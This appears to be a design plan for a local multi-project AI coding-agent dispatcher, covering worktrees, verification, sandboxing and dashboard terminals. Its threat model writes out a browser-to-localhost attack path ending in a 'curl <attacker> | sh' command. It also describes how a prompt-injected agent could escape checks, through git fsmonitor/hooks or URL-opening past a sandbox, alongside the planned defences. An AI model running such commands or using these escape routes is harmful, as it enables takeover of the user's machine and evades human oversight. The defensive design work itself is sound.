---
status: in-progress
created: 2026-10-13
---

# Task: Multi-Project Dispatch — Project Registry, Verify Harness, Project/Session View

## Goal
Make AgenticOS the single place to dispatch and review work across many local projects, instead of juggling one IDE/terminal window per project. Today every agent launch is hardcoded to the runner's own root, so it cannot run work anywhere else. This plan adds three things:
- a project registry;
- isolated per-ticket worktrees with a per-project verify step, so review items arrive pre-checked;
- a dashboard grouped by project instead of skill, where each project lists its Claude and Codex sessions in a `/resume`-style list.

Registry design: the real `projects.yaml` sits at the repo root and is **gitignored**, because entries name private and client projects and this repo is public. `projects.example.yaml`, which uses fake entries, is committed and documents the schema. The path can be overridden with `AGENTIC_OS_PROJECTS`.

Harness lesson: agents run non-interactive shells, so the interpreter found on PATH can differ from the one the IDE uses. For example, Homebrew R without packages is found instead of conda R, and child processes inherit that. Each entry therefore pins `env.PATH` explicitly.

State of the code this plan builds on (refreshed 2026-10-14 for Round 10):
- The dsh backend swap has landed (`3647fec`, plan archived in `docs/exec-plans/completed/2026-10-14-dsh-backend-swap.md`). The agent ids are `claude`, `codex` and `dsh`. Legacy `deepseek`, `deepseek-tui` and `aider` alias to `dsh` through `runner/agent_ids.py`.
- `RUN_LOG` moved out of the knowledge base (`8167cfa`). It now defaults to `state/run_log.jsonl` in this checkout (`runner/app.py:126`). `state/` and `outputs/` are gitignored.

## Threat Model
Single user, localhost, one Flask process plus occasional CLI calls. Agents are trusted not to be malicious. The safeguards below stop **accidents**: confidential text leaking to Linear, an agent writing to the main checkout, seed data being committed, and concurrent runs clobbering each other. They detect these or fail closed.

Full containment of a hostile agent is a non-goal: no containers and no separate OS user. One exception (Decision 9): `confidential` projects run under the agent CLI's own built-in sandbox, because prompt injection can make a trusted agent act badly. That sandbox limits shell writes and shell network access. It does not limit reads.

## Security Precondition: Browser Request Checks (do first, independent of every phase)
Added 2026-10-14 and widened after Round 5 (MPD-21/22) to cover HTTP as well as Socket.IO. These are pre-existing holes and do not depend on this plan. A live check on 2026-10-14 (after the runner restart) confirmed they are still open: `GET /stream` returns 200, and a request with `Host: evil.example` returns 200.
- **Hole.** `runner/app.py:143` creates `SocketIO(app, cors_allowed_origins="*")`. Browsers' same-origin policy does not stop a page from opening a WebSocket to another origin; the server has to check the `Origin` header itself, and `"*"` turns that check off.
- **Why binding to `127.0.0.1` (`runner/app.py:3320`) does not help.** The connection comes from the user's own browser, which is on the same machine.
- **Attack path.** It needs no click, only a page load.
  1. The runner is up, which is always under launchd `KeepAlive`.
  2. The user opens any malicious or compromised page, or an ad.
  3. Its JavaScript connects to `ws://127.0.0.1:8510`.
  4. It emits `pty_start` (`runner/modules/pty/__init__.py:131`), then `pty_input` with an arbitrary command, e.g. `curl <attacker> | sh`.
  5. The command runs as the user, with access to `~/.ssh`, API keys and every local repo, including confidential ones.

  Other Socket.IO events, such as `skill_selected`, are exposed the same way.
- **HTTP holes (Round 5).** Flask routes are not covered by the Socket.IO origin list.
  - **Plain cross-site request.** `GET /stream?prompt=…&agent=…` (`runner/app.py:2539`) starts an agent run from query parameters. A plain `<img src>` on any page triggers it. That needs no JavaScript and no preflight, and the browser blocking the response does not stop the dispatch. Multipart `POST /upload`, `/api/board/upload` (`runner/modules/pty/__init__.py:184,215`) and `/api/stt` (`runner/modules/stt/__init__.py:158`) are simple requests too: a page can write files or spend STT quota.
  - **DNS rebinding.** A page on an attacker host that re-resolves to `127.0.0.1` becomes same-origin with the runner. It can then send JSON to `POST /run` (`:2367`, a Claude run in `bypassPermissions` mode) and read every API response. Flask 3.1.3 has `TRUSTED_HOSTS=None` by default, so it checks no Host header.
  - Engine.IO's default `cors_allowed_origins=None` takes the allowed origin from the request's own Host header (`engineio/base_server.py:284`), so just deleting `"*"` would still let a rebinding page in. The explicit list below does not have that problem.
- **Fix.** All allow-lists come from the actual `--host`/`--port` arguments, never from request headers.
  - **Socket.IO.** Pass `cors_allowed_origins` an explicit list: `http://127.0.0.1:<port>` and `http://localhost:<port>`, plus `http://<host>:<port>` when `--host` is something else. Never use `"*"`. `socketio` is created at import time (`:143`), before argument parsing in `main()` (`:3317`), so either set `socketio.server.eio.cors_allowed_origins` after parsing or create `SocketIO` after parsing, whichever is the smaller diff.
  - **Host.** `app.config["TRUSTED_HOSTS"] = ["127.0.0.1", "localhost", <host>]`. A request with any other Host gets a 400 before any route runs, and that blocks DNS rebinding on every Flask route.
  - **Delete `GET /stream`.** It has no caller: `index.html` has no `EventSource`, and nothing else in the repo or the LaunchAgents refers to it (grep, 2026-10-14). Deleting it removes the no-JavaScript attack.
  - **Per-process request token (Round 6, MPD-35).** This replaces a Fetch-Metadata header guard. Browsers that send neither `Sec-Fetch-Site` nor `Origin` would have got straight past such a guard.
    - At startup the runner creates `secrets.token_urlsafe(32)` and renders it into `index.html`.
    - One `@app.before_request` hook requires the header `X-AgenticOS-Token` to equal the token (`hmac.compare_digest`) on every request except `GET /`, `/favicon.ico`, static files and `GET /api/board/uploads/<f>`. A missing or wrong token gets 403, whatever other headers the request carries.
    - **Why attachment downloads are exempt (Round 7, MPD-38).** Attachments open through plain `<a href>` links (`index.html:4005`), which cannot carry a header. The route is a read-only file serve. The token never goes into a URL. Missing CORS alone does not protect it, because no-cors embedding still works (MPD-40). A foreign page could load an uploaded `.js` with `<script src>` and read the globals it defines. So the response also carries `Cross-Origin-Resource-Policy: same-origin`, which blocks every cross-origin embed. The Host check stops rebinding.
    - **Uploaded files cannot run as the dashboard.** An uploaded HTML or SVG file is served from the dashboard origin, where it could read the token. So `api_board_uploads_serve` (`runner/modules/pty/__init__.py:209`) adds `Content-Security-Policy: sandbox`, `X-Content-Type-Options: nosniff` and `Cross-Origin-Resource-Policy: same-origin`. The file then opens in an opaque origin with scripts disabled.
    - On the client, `window.fetch` is replaced once, before any other script runs, by a wrapper that adds the header to same-origin requests. Direct `fetch()` calls, including the STT block's `fetch('/api/stt')` and `fetch('/api/linear/id-aliases')`, therefore need no change. Any `XMLHttpRequest` upload sets the header itself.
    - Socket.IO connects with `io({auth: {token}})`, and the `connect` handler rejects a mismatch. That is a second layer behind the Origin list.
    - A cross-site page cannot read the token: the same-origin policy hides the page from it, and the Host check stops DNS rebinding from loading `/`. A custom header also forces a CORS preflight, which the runner never answers.
    - No CLI client calls the runner over HTTP today (same grep), so no token file is needed. Add one (mode 600) only when such a client appears.
  - **No framing (MPD-36).** An `after_request` hook sets `Content-Security-Policy: frame-ancestors 'none'` on every response. A cross-site page then cannot load the dashboard in an iframe, where it would get the token and auto-open a PTY (`index.html:3728-3732`), or use it for clickjacking. Ordinary links and bookmarks to `GET /` still work.
- **Not a mitigation.** Newer Chrome builds restrict public pages from reaching private addresses (Private Network Access). Enforcement for WebSockets and in other browsers varies, so it cannot be relied on.
- **Verification.** Socket.IO checks use the existing `python-socketio` client or a raw WebSocket handshake. HTTP checks use the Flask test client. Agent launch is stubbed so that no real CLI runs. Each check is a Phase 0 checkbox below.
- Found by code reading on 2026-10-14 (Socket.IO by the host; `/stream`, uploads and rebinding confirmed in Round 5). None of the holes was exploited in a live test.

## Key Decisions (settled with user 2026-10-13)
1. **Run location = per-ticket git worktree, never the main checkout.**
   - Worktree at `~/.agentic-os/worktrees/<key>/<issue-identifier>`, outside every repo, so seeded data never lands under agentic-os. Created with dir mode 700.
   - Branch `agent/<issue-identifier>`, based on the project's `HEAD`. The agent commits on that branch.
   - Accept = the user merges manually. Reject = remove the worktree and branch via `projects.py cleanup <key> <identifier>`.
   - Several worktrees per project may run in parallel, so there is no project lock. A rework of the same ticket reuses its existing worktree and branch. **One launch per ticket at a time**: a per-ticket file lock (`fcntl.flock`, non-blocking, on `~/.agentic-os/worktrees/<key>/<id>.lock`) is held across worktree create/reuse → run → verify → cleanup, by both the dashboard and every `projects.py` subcommand. An overlapping launch, CLI verify or cleanup on the same ticket is rejected; different tickets are independent (today the retry guard at `runner/app.py:2869` is a no-op `pass`).
   - `seed:` lists gitignored paths that tests need, as paths relative to the project root (absolute paths and `..` rejected; resolved source must stay inside the root). They are copied from the main checkout into the worktree at creation with `shutil.copytree(symlinks=False)` / `shutil.copy2`, which dereference links into independent files, so the agent cannot write through to the original data. A missing seed path or a dangling link ⇒ dispatch fails before the agent starts. **Destination checks:**
     - The destination must not exist in the fresh worktree. A collision with a tracked path is rejected.
     - No destination ancestor may be a symlink, which a committed directory symlink could create. This is checked again on worktree reuse.
     - After copying, every seed must be ignored by the worktree's own committed rules. `git check-ignore` alone is not enough, because it also reads global excludes and the shared `.git/info/exclude` (Build inspection 1, MPD-R2). So the check runs `git -C <wt> check-ignore -v <seed>` and accepts only when the winning rule comes from a `.gitignore` inside the worktree that is tracked at `HEAD` and unmodified.
     - Before a run is marked for review, `git -C <wt> log --name-only <base>..HEAD` must not touch any seed path. If it does, the verify badge shows `seed committed`, the run fails, and the card tells the user to run `projects.py cleanup` rather than merge.
   - A project whose verify target is not committed at `HEAD` cannot be dispatched. The registry loader reports this, and the fix is for the user to commit (AgenticOS never commits to a project's main branch).
   - **Binding is persisted, never re-derived.** The first launch records `{project_key, issue_identifier, worktree, branch, base_sha}` on the run record (additive fields). Retry/rework, verify, archive and restore read the binding from the task's earlier run, not from the current Linear label. Missing binding or missing worktree for a bound task ⇒ fail closed with an error on the card; never fall back to the legacy runner-root launch.
   - **Main-checkout guard.** Non-confidential Claude runs are unsandboxed (`bypassPermissions`). Non-confidential Codex runs under a sandbox whose escalations an auto-reviewer may approve. Non-confidential `dsh` runs under its own `workspace-write` sandbox, which confines writes to the cwd (dsh spike (c)). Confidential agents are sandboxed (Decision 9). In every case the main repo's git dir stays writable. "Never touch the main checkout" is therefore detected, not prevented: before and after each run, record a fingerprint of the main checkout: `HEAD` SHA, sha256 of `git diff --cached --binary`, sha256 of `git diff --binary`, and `(path, size, mtime_ns)` for every untracked and ignored file (`git status --porcelain -uall --ignored=matching`, walking listed dirs). Runner bookkeeping paths are excluded: the set is computed at runtime as the files AgenticOS itself writes inside that checkout. Since `RUN_LOG` left the knowledge base, that set is empty for every project except agentic-os itself (its gitignored `state/` and `outputs/`), so concurrent runs elsewhere do not trigger false alarms. The fingerprint also covers git configuration that agents can write, because a changed hook or `core.fsmonitor` would otherwise run later in the user's own git commands (Build inspection 1, MPD-R1). It takes a sha256 of the **effective** configuration, `git config --list --show-origin --includes`, run in the main checkout, plus the listing (name, size, mode, mtime_ns) of the effective hooks directory, `git rev-parse --git-path hooks`. It also covers the checked-out branch (`symbolic-ref HEAD`), every shared ref except `refs/heads/agent/*` and `refs/remotes/*` (this catches a dropped stash or a moved tag), and the `ls-files -v` flags (skip-worktree and assume-unchanged), per I4-03. That one lookup goes through the helper with only `core.fsmonitor=false`, because the helper's own `core.hooksPath=/dev/null` would otherwise hide the real directory (Round 13, MPD-47). `rev-parse` runs no hooks. Hashing the top-level `config` file alone would miss included files, `config.worktree` and a redirected `core.hooksPath` (Round 12, MPD-46). The closing snapshot is taken last, after the runner commit, the seed check and verify, because all three run code that could write the shared git dir (I4-05). Any other difference, or a snapshot error, ⇒ the card shows "main checkout changed" and the verify badge is forced to fail. Limit: a write that restores size and mtime of an ignored file goes undetected. That is accepted under the threat model.
   - **Runner git commands are hardened (Build inspection 1, MPD-R1).** An agent can write the shared git config, for example `core.fsmonitor` pointing at a script in its worktree, and git then runs that script inside the runner's own `git status`.
     - Every runner-owned git command against a project repo or worktree (fingerprint, seed checks, `committed_seeds`, shortstat, worktree create/remove) goes through one helper. The helper passes `-c core.fsmonitor=false -c core.hooksPath=/dev/null` and, for diff commands, `--no-ext-diff --no-textconv`.
     - For confidential bindings, the helper also runs git under the Decision 9 `sandbox-exec` profile. Filter drivers and other repo-configured helpers that `-c` cannot switch off then get no network and no writes outside the worktree.
     - If spike (g) shows that `sandbox-exec` does not work, **confidential dispatch is refused**, because runner git commands cannot be confined.
   - **Process-tree ownership.** Project agent and verify processes start with `start_new_session=True`. On **every** exit path (success, error, cancel, timeout), `os.killpg` sends the group SIGTERM, then SIGKILL after 5 s. That stops background servers and watchers an agent left behind. The group is reaped before verify, cleanup or lock release. The same rule applies to the verify process group before results are recorded.
2. **Verify runs only in an owned worktree.** `projects.py verify` requires `--worktree` (a baseline check uses `projects.py worktree <key> CHECK` first). `{root}` in `verify` expands to the main-checkout path, for tools that live only there, such as `{root}/.venv/bin/python`; `{base}` expands to the persisted `base_sha`. `env.PATH` is prepended to the inherited PATH and never replaces it. Verify has a timeout (default 600 s, `verify_timeout_s` overrides). The raw verify output tail is kept locally only.
3. **Tracker routing = Linear label `project:<key>`.** The poller already filters on one `project_slug` (`runner/linear_client.py:263`) and already fetches labels, so a label needs no poller change. Unlabelled tickets keep today's behaviour, running at the runner root. Project-bound tickets skip the LLM skill-routing call.
3a. **One dispatch path for all launches of a project ticket.** Today `cwd=str(ROOT)` is hardcoded at `runner/modules/linear/__init__.py:544,580` (routing + auto-dispatch), `runner/app.py:2931` (retry/rework) and `runner/app.py:2395,2456` (`/run`). The `/stream` site (`:2575`) goes away with the Security Precondition. All project-bound launches go through one helper that resolves the binding → worktree → `cwd` + `env`. Project tickets always launch the agent CLI via `_ai_command` — never `run_skill.py` executable entrypoints (which resolve against the runner root). Allowed backends for project tickets: `claude`, `codex` and `dsh`, compared after `canonical_agent()`.
   - **Runner-side commit for sandboxed Codex runs (spike 2026-10-14).** Codex's `workspace-write` sandbox keeps the shared `.git` read-only whatever `--add-dir` or `writable_roots` say. Every sandboxed variant failed to create `.git/worktrees/<id>/index.lock`: confidential flags, no `writable_roots` override, the common dir as the only writable root, and `--approve-for-me`. `dsh` and Claude commit for themselves (dsh plan spike (e); Claude spike (b)).
     - For sandboxed Codex runs (confidential, and non-confidential `--approve-for-me`), the prompt says to leave changes uncommitted.
     - After the run, still holding the ticket lock, the runner commits on `agent/<id>`. It reaps the agent's process group, then runs `git add -A` (which skips seeds, since they must be ignored by committed rules), then `git commit --no-verify --no-gpg-sign -m "<issue-id>: <title>"`. Runner commits are unsigned: `--no-verify` skips hooks but not signing, and a project with `commit.gpgSign=true` and a locked key would otherwise block or fail (Round 13, MPD-48). The commit runs with a 60 s timeout and process-group cleanup. Both go through the hardened git helper (Decision 1), confined for confidential bindings. The runner first re-checks that the worktree is still on `agent/<id>` and refuses to stage or commit otherwise (I5-10). Verify then runs on the result, followed by the binding re-check and the `seed committed` scan, because verify can run git too (I5-14). Uncommitted tracked or non-ignored files left by a committing agent make the badge `uncommitted changes`, never `pass` (I5-11).
     - With no changes, nothing is committed and the run reports no diff.
     - When the repo has no git identity, the helper passes `-c user.name=AgenticOS -c user.email=agentic-os@localhost`.
   - **Incremental run events (MPD-31).** The launch helper reads the agent's stdout line by line for every backend and launch path, including Linear auto-dispatch, which today waits on `communicate()`. Each structured event becomes one normalized line (assistant text, `[tool] <name> <short arg>` or `[result] ok|error`). Those lines go into a bounded in-memory ring per run (about 256 KB) and are emitted as `run_event`. Completion parsing reads the same lines, and Decision 10 `run` tabs render them.
4. **Confidential redaction is enforced in code, at one gate.** Every automatic tracker comment (run result, error, timeout, retry "Human Feedback" at `runner/app.py:2904`, attachments) goes through one `tracker_comment(binding, kind, **fields)` gate. For `confidential: true` the body is a fixed template from trusted structured fields only: run status, `verify: pass|fail (exit N, D s)`, `git diff --shortstat` counts vs `base_sha`. No prompt echo, agent output, verify output, error text, feedback text, attachment names, file names or diff; an error reads "see local run <run_id>". Human-feedback comments for confidential tickets are not posted at all (feedback stays in the local run record). The current `_linear_comment_body` (`runner/modules/linear/__init__.py:232`) is never called for confidential bindings.
4a. **Local run records stay runner-local (simplified 2026-10-14, Round 10).** The earlier side-file design existed only because `RUN_LOG` lived in the knowledge-base checkout, which is itself a registered project. Since `8167cfa`, `RUN_LOG` (`runner/app.py:126`), the task state and `runner/run_skill.py`'s `outputs/run_log.jsonl` all live under this checkout's gitignored `state/` and `outputs/`. Confidential prompts, outputs and errors therefore stay in the ordinary run records, with no side file, no `"[local]"` placeholders and no rehydration helper. Redaction applies only to what leaves the machine (Decision 4).
   - **Guard (Round 10, MPD-41/42).** The check does not depend on which projects are registered. At startup, when the registry holds any `confidential: true` project, the runner resolves `RUN_LOG`, `STATE_DIR` and `OUTPUTS_DIR`. Each must lie inside this checkout and be ignored by a tracked, unmodified `.gitignore` in it. This uses the same `check-ignore -v` provenance check as seeds, so global excludes and `.git/info/exclude` do not count. If not, the runner **refuses to start** with a clear error. It refuses outright rather than only disabling confidential dispatch, because other writers, such as terminal handoffs (`runner/modules/pty/__init__.py:91-113`) and stall detection, call `_write_run_log` directly. So no writer can put confidential text in an unsafe place.
     - A `RUN_LOG_PATH` override to any other place, for example a tracked file in an unregistered public repo, therefore stops startup while confidential projects are registered.
     - No LaunchAgent sets `RUN_LOG_PATH` (grep, 2026-10-14). Tests patch `app.RUN_LOG` directly and do not go through startup.
4b. **Shared-state writes are serialized.** Parallel completions make `_write_run_log`'s unlocked read-modify-write of `task_state.json` / `job_state.json` racy (`runner/app.py:1887-1925`). `state/tasks.json` has the same race (Build inspection 1, MPD-R3). `LocalTracker` loads the whole file before taking its write-only `_SAVE_LOCK` (`runner/modules/linear/local_tracker.py:70,163`), and the Linear cache sync and comment writers also rewrite it. `run_skill.py` `_update_state` (`runner/run_skill.py:96`) also rewrites `outputs/job_state.json` from another process. The one-off `scripts/migrate_team_fields.py` also rewrote `tasks.json` without a lock (Round 13, MPD-49). Its migration is already applied (0 of 94 tasks lack `team_id`, 2026-10-14), so it is deleted rather than locked. Every read-modify-write of `job_state.json`, `task_state.json` and `tasks.json`, in `app.py`, `run_skill.py`, `LocalTracker` and the Linear module's cache-sync and comment writers, holds a cross-process `fcntl.flock` on a sibling `<file>.lock` for the whole load → change → save transaction. Each write goes to a unique temp file in the same dir (`tempfile.mkstemp`) and then `os.replace`. `projects.py` never writes these files.
5. **`no_push: true`** ⇒ the dispatch prompt forbids push/deploy. Enforcement is prompt-only (accepted risk, see Risks).
6. **Dashboard: project sections replace the skill-stack sections.**
   - Remove the skill card grid and its JS: stack grouping (`runner/templates/index.html:726-732`, `:1007`) and agent-compat greying.
   - Keep the skill registry build and `_load_registry` for the CLI and `/run`.
   - The knowledge base is registered as a project (`confidential: false`, `no_push: true`, verify `git diff --check {base}` so committed and uncommitted changes since the base are both checked). KB skills are invoked through ticket prompts, e.g. `/llm-wiki-ingest raw/x.md`. A full wiki lint is not used as verify because ~2,333 historical findings would make it fail forever.
7. **Code layout:** all new logic goes in one module, `runner/projects.py`, which holds the loader, verify, worktree create/seed/cleanup and the two session readers. Its CLI is `.venv/bin/python3 runner/projects.py {list|worktree|verify|cleanup} …`. This avoids overloading `run_skill.py`'s skill-name namespace and its lock/retry semantics.
8. **Verify failure has no new state.** The board has no Human Review column and the run-status set is closed (`AGENTS.md`). A project run always ends in the existing `review` status / In Review column; the card carries a verify badge (`pass` / `fail` / `timeout` / `main checkout changed`) from additive run-record fields. Failing runs sort first in the In Review column.
9. **Confidential projects run under the agent CLI's built-in sandbox** (added 2026-10-14). Agent shell commands get no network and can write only to the worktree and the paths below. This is a second layer on top of the main-checkout fingerprint, which stays in place.
   - **Scope.** The hard sandbox below applies only to bindings with `confidential: true`. Non-confidential Codex runs get a softer mode (see the next bullet). Non-confidential Claude runs keep today's flags, and non-confidential `dsh` runs keep their `workspace-write` mode. There is no separate `sandbox:` registry field.
   - **Non-confidential Codex project runs use `--approve-for-me`** (added 2026-10-14 by user decision). It is passed without `--sandbox`: the flag already selects the `workspace-write` sandbox with on-request approvals (`codex exec --help`), and the CLI reference lists the two flags as conflicting (MPD-23).
     - The git common dir is passed via `--add-dir`, as for confidential runs.
     - `--approve-for-me` sets `approvals_reviewer="auto_review"`. Requests that go beyond the sandbox, such as a package install, network access or a write outside the worktree, then go to a reviewer model instead of a person.
     - This is an upgrade from today's full bypass, and the user is still never asked.
     - It is not used for confidential projects, for three reasons:
       - OpenAI documents auto-review as "not a deterministic security guarantee", weakest in adversarial contexts, and prompt injection is exactly the threat Decision 9 addresses.
       - The reviewer needs an interactive approval policy such as `on-request`, so it cannot be combined with `approval_policy="never"`.
       - Its behaviour under `codex exec` is undocumented.
     - If spike check (f) fails, non-confidential Codex runs go back to today's bypass flags. That keeps current behaviour, so it is not a regression. Record the fallback in the plan. An argv or usage error is a bug in the command line and gets fixed. Only a real behaviour failure, such as a hang or no commit, triggers the fallback.
   - **Codex (flags verified in `codex-cli 0.162.0 --help`).** Replace `--dangerously-bypass-approvals-and-sandbox` with `--sandbox workspace-write`. Writable roots are the worktree (cwd) and `/tmp`. Add `--add-dir <git common dir>` (`git -C <wt> rev-parse --git-common-dir`), because commits on `agent/<id>` write objects and refs into the main repo's `.git`. Pin `-c 'approval_policy="never"'`. `codex exec` rejects `-a`, so the setting goes through a `-c` config override. With this setting the agent never asks: a blocked action fails and the error goes back to the model. Spike check (a) confirms the override is honoured.
     - **Pin the whole policy, not just argv (MPD-24).** Inherited `~/.codex/config.toml` could turn on `sandbox_workspace_write.network_access` or add `writable_roots`, so the command line also passes `-c sandbox_workspace_write.network_access=false` and `-c 'sandbox_workspace_write.writable_roots=[]'`. The only extra root is the `--add-dir` above.
     - The spike runs once more with a temporary `CODEX_HOME` whose config enables network and adds a writable root. Checks (c) and (d) must still block.
   - **Claude (unverified).** Pass a per-run `--settings <file>` that enables Claude Code's sandbox. Bash writes are limited to the worktree plus the git common dir, Bash network is off, and Bash commands are auto-allowed only when sandboxed. Replace `bypassPermissions` with a mode that auto-accepts edits inside the working directory and refuses them elsewhere, such as `acceptEdits` plus `--add-dir` for the git common dir. Add `permissions.deny` read rules for `**/.env*` and `~/.ssh/**`. The spike settles the exact keys and whether this combination keeps non-interactive `-p` runs from stalling.
     - **Pin the whole policy (MPD-24).** The settings file sets:
       - the sandbox to fail rather than run unsandboxed when it is unavailable (`failIfUnavailable`);
       - unsandboxed retries off (`allowUnsandboxedCommands: false`);
       - no `excludedCommands`.
     - `--setting-sources` is narrowed so that user, project and local settings cannot widen the policy. This matters most for project settings: `.claude/settings.json` lives in the worktree, and the agent can write to it.
     - The spike confirms the exact key names, that authentication still works, and that a permissive `.claude/settings.json` committed in the worktree is ignored.
   - **`dsh` is always rejected for confidential projects** (dsh plan, Decision 3): its Seatbelt profile confines writes but leaves shell network open. This changes only if a later dsh release adds network confinement and the dsh spike's (c) and (d) are rerun.
   - **Fail closed.** If a backend's sandbox flags fail the spike, that backend is rejected for confidential projects. It never falls back to bypass mode.
   - **What this does not cover.**
     - Reads stay broad: Codex `workspace-write` can still read the whole disk, so an agent can still read other repos and secrets. The deny rules above narrow this only for Claude.
     - What the model reads still goes to its provider.
   - **Verify gets the same boundary (MPD-25).** Verify runs code that the agent may have edited, such as a test or an imported module. Run outside the sandbox, a prompt-injected edit would get the runner's full privileges.
     - For confidential bindings, verify runs under macOS `sandbox-exec` with a fixed profile.
       - It denies `network*` and `file-write*`, except writes to the worktree, its own per-worktree git dir (`.git/worktrees/<id>`), `/tmp` and `$TMPDIR`. Verify never writes the shared config, hooks or refs (build inspection 4, I4-05).
       - It also denies `lsopen`, `appleevent-send` and lookups of the LaunchServices and AppleEvents services. Without those denials, a sandboxed `open http://…` handed the URL to the browser, outside the sandbox: a probe reached a local listener (I4-01, reproduced 2026-10-14).
       - ponytail: this is a deny-list over allow-default, so git, shells and test runtimes keep working. Spike (g2) probes the known escape routes.
     - Spike check (g) proves it: a verify command whose imported module tries an external write and a `curl` fails on both, while a normal test passes.
     - If (g) fails, confidential dispatch is refused altogether, because runner git commands could not be confined either (Decision 1). This replaces the earlier `verify: manual` fallback.
     - Non-confidential verify keeps running unsandboxed, as today.

10. **Terminal tabs: several live terminals in the dashboard, one per session** (added 2026-10-14 at the user's request). The terminal is the user's preferred view, because feedback and logs show directly. With several projects running, the user wants one tab per session, the ability to click any of them open, and to hide them without stopping them. Today there is one PTY per browser socket (`runner/modules/pty/__init__.py:131-149`). It always starts at `ROOT`, and on disconnect its fd is dropped but the shell is never killed (`:177-181`), so reloading the page loses the session and leaks the process.
   - **Server-owned terminals, not socket-owned.**
     - A registry `term_id -> {pid, fd, kind, project_key, cwd, created_at, scrollback}` lives in the PTY module.
     - `scrollback` is an in-memory ring buffer of about 256 KB per terminal.
     - Socket events carry `term_id`: `term_list → [{term_id, kind, project_key, run_id, cwd, alive, exit_code}]`, `term_open {kind, project_key|run_id, cols, rows} → term_id`, `term_attach {term_id}`, `term_input`, `term_resize`, `term_close`.
     - **Reload (MPD-29).** Connecting no longer opens a PTY. The client calls `term_list` first, rebuilds a tab for each entry and attaches to it. It opens a new terminal only on a user action. An unknown `term_id` returns an error, and the client drops that tab.
     - **No lost output on attach (MPD-30).** Each terminal has one lock. The reader thread appends to scrollback and emits to the room while holding it. `term_attach` takes the same lock, joins the room, sends the scrollback snapshot, then releases. Output therefore either lands in the snapshot or arrives after it, never in neither. No sequence numbers are needed.
     - A browser disconnect only detaches. The process keeps running and the user can reattach after a reload.
     - **Close (MPD-28).** `term_close` and server shutdown kill every process group in the shell's session, not just the shell's own group, because job control puts foreground and background jobs in separate groups.
       - `pty.fork()` makes the shell a session leader, so its sid equals its pid.
       - **Finding the groups (Round 6, MPD-37).** macOS `pgrep` has no `-s` (it exits 2), and macOS `ps` reports `sess` as 0. So the handler lists `ps -A -o pid=,pgid=`, keeps the pids where `os.getsid(pid)` equals the shell's sid, and deduplicates their pgids. That also finds a group whose leader has already exited.
       - Each group gets SIGHUP, then SIGTERM, then SIGKILL after 5 s. A pid that vanishes during the scan is skipped. If the enumeration itself fails, the close is a failure: the tab stays in `term_list` as `cleanup_failed`, and the error is logged. The handler then calls `waitpid` on the shell and closes the fd.
       - Limit: a process that calls `setsid` itself (a daemon) leaves the session and is not tracked. That is the same as closing a normal terminal.
     - There is a cap of 8 live terminals (`AGENTIC_OS_MAX_TERMINALS`). Opening another fails with a clear message.
   - **Two tab kinds.**
     - **`shell`: an interactive login shell in a project.** It opens in the project's main path by default, or in a bound ticket's worktree when opened from a card. It gets the registry `env.PATH` prepended, as verify does, so `R`, `claude` and `codex` resolve the same way as in the IDE.
       - This is the user's own terminal, like a VS Code terminal, so the "agents never touch the main checkout" rule does not apply to it.
       - It does interact with the main-checkout fingerprint (Decision 1). If a `shell` tab is open on a project's main path while a dispatched run for that project is in flight, the run record notes `interactive_tab_open: true`. A "main checkout changed" badge then reads "main checkout changed (interactive tab open)", so the user can tell their own edits from an agent's.
       - **Bound-worktree tabs own the ticket (MPD-27).** A `shell` or resume tab opened in a bound worktree holds that ticket's lock (Decision 1) for as long as it is open. A dispatch, retry, verify or `projects.py cleanup` on that ticket is then refused with "close terminal <term_id> first". `run` tabs and main-path shells take no lock.
     - **`run`: a read-only live view of a dispatched run.** Dispatched runs stay headless (`claude -p --output-format stream-json`, `codex exec --json`, `dsh --json`), because verify, the run log and completion detection depend on structured output. The tab renders the run's normalized `run_event` lines from the launch helper's in-memory ring (Decision 3a) in xterm. Today's `run_progress` events cover only some paths, so the tab does not use them. It accepts no input.
       - When the run ends, the tab shows the final status and verify badge and offers **Resume in tab**. That opens a resume tab in the run's worktree for interactive follow-up. A running session is never resumed concurrently.
       - **Resume goes through the same policy builder (MPD-26).** The resume command comes from `_ai_cli(binding, interactive=True)`, not a bare `claude --resume` / `codex resume`. That builder applies the same backend eligibility, sandbox settings, pinned Codex config and `--add-dir` as headless dispatch. When a confidential binding has no verified interactive sandboxed form, or the backend has no interactive resume (`dsh` has no TUI), the button is not shown. A command the user types in a `shell` tab is the user's own and is not filtered.
   - **Session list integration (Phase 1 view).** Each session row gets **Resume in tab** next to the existing copy-command button. Each project header gets **Open terminal**.
   - **UI.**
     - A tab strip sits above the existing bottom terminal panel. Each tab is labelled `<project key> · shell|run · <short id>`, with a status dot (running, exited, run review/fail).
     - Clicking a tab switches between xterm instances (one `Terminal` object per tab, created lazily and disposed on close).
     - The panel collapse button hides the panel only; nothing is killed. Closing a tab (×) kills its process after a confirm, unless the process has already exited.
     - The panel keeps today's resize handle and its saved height.
   - **Tabs add no persistence (MPD-32).** Scrollback from `shell` and resume tabs exists only in server memory and the browser, is never written to disk, Linear or the run records, and is discarded on close. A `run` tab shows the run's in-memory event ring; the run's own records are unchanged and remain the only persisted copy.
   - **Security.** The browser request checks ("Security Precondition" above) must be merged before this work starts. More terminals mean more to lose through that hole. Keep the default bind at `127.0.0.1` (`:3320`).
   - The existing skill-handoff PTY features (`skill_selected`, `_record_pending_handoff`) are keyed by `term_id` instead of socket sid. **Handoff logging follows the binding (MPD-34):** the handoff looks up the terminal's `project_key` and records it on the run record it writes. Since run records are runner-local (Decision 4a), the typed command needs no extra redaction there, and it never goes to Linear.

11. **Tracker reset generation (DSH-30, moved here from the dsh plan's inspection 4; a pre-existing gap for every agent).**
   - **Problem.** Dragging a linked ticket to Todo goes through the tracker PATCH routes (`runner/modules/linear/__init__.py` local and Linear issue PATCH), which write no `todo`/`rework` run record. `_get_task_agent_lock` (`runner/app.py:2300`) reads only `RUN_LOG`, so a later retry resumes the discarded session (`--resume`, `resume`, `--session-id`) and silently overrides an agent change.
   - **Why a marker record is not enough (Round 10, MPD-43).** A run still in flight at reset time later appends a newer completion carrying its session (`runner/app.py:2992-3002`), and restore re-appends an old session-bearing record (`:2773-2781`). Either one sits after the marker, so `_get_task_agent_lock` (`:2316-2330`) would pick it up.
   - Each task gets a `reset_gen` integer in `task_state.json`, starting at 0. Every reset increments it under the 4b lock: the tracker Todo routes and the existing todo/rework status paths.
   - Every launch records the task's current `reset_gen` on its run records. Legacy records without the field count as 0.
   - `_get_task_agent_lock` and retry consider only records whose `reset_gen` equals the task's current one. Completions and restores from an older generation stay visible in history, but can never be resumed or set the agent lock.
   - The boundary survives a fresh launch that fails before emitting a session id, because the generation lives in task state, not in a log record.
